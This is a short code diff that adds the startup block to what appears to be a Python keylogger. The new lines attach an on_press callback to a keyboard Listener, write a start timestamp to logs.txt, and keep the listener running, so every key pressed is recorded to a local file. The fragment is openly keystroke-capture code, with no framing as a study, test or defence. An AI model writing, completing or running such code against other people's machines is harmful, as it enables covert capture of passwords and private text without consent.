@@ -44,3 +44,9 @@ def on_press(key):
                 f.truncate()
         else:
             f.write(str(key).strip("'"))
+
+
+with Listener(on_press=on_press) as listener:
+    with open("logs.txt", "a") as f:
+        f.write(f"Logging started at: {datetime.datetime.now()}\n")
+    listener.join()
